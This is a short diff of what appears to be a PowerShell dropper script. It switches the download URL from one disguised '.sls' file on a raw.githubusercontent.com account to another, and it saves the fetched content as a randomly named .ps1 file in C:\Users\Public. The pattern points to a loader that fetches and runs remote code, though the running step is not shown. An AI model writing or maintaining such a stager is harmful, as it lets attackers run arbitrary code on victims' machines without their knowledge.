@@ -1,4 +1,4 @@
-$url = "raw.githubusercontent.com/robotinsideus12/trust/refs/heads/main/try.sls"
+$url = "raw.githubusercontent.com/robotinsideus12/trust/refs/heads/main/new.sls"
 
 $randomFileName = (Get-Random).ToString() + ".ps1" $filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName
 
